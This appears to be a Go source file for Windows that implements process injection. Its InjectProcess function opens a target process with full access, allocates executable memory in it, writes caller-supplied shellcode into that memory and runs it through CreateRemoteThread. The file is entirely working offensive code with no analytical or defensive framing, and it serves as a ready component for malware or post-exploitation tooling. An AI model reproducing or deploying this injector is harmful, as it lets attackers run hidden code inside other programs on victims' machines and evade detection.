package main

import (
    "syscall"
    "unsafe"
    "fmt"
)

var (
    kernel32             = syscall.NewLazyDLL("kernel32.dll")
    procOpenProcess      = kernel32.NewProc("OpenProcess")
    procVirtualAllocEx   = kernel32.NewProc("VirtualAllocEx")
    procWriteProcessMemory = kernel32.NewProc("WriteProcessMemory")
    procCreateRemoteThread = kernel32.NewProc("CreateRemoteThread")
    procCloseHandle      = kernel32.NewProc("CloseHandle")
)

const (
    PROCESS_ALL_ACCESS = 0x1F0FFF
    MEM_COMMIT         = 0x1000
    PAGE_EXECUTE_READWRITE = 0x40
)

func InjectProcess(pid uint32, shellcode []byte) error {
    hProcess, _, err := procOpenProcess.Call(uintptr(PROCESS_ALL_ACCESS), 0, uintptr(pid))
    if hProcess == 0 {
        return fmt.Errorf("OpenProcess failed: %v", err)
    }
    defer procCloseHandle.Call(hProcess)

    addr, _, err := procVirtualAllocEx.Call(hProcess, 0, uintptr(len(shellcode)), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    if addr == 0 {
        return fmt.Errorf("VirtualAllocEx failed: %v", err)
    }

    var written uintptr
    ret, _, err := procWriteProcessMemory.Call(hProcess, addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), uintptr(unsafe.Pointer(&written)))
    if ret == 0 {
        return fmt.Errorf("WriteProcessMemory failed: %v", err)
    }

    thread, _, err := procCreateRemoteThread.Call(hProcess, 0, 0, addr, 0, 0, 0)
    if thread == 0 {
        return fmt.Errorf("CreateRemoteThread failed: %v", err)
    }

    return nil
}
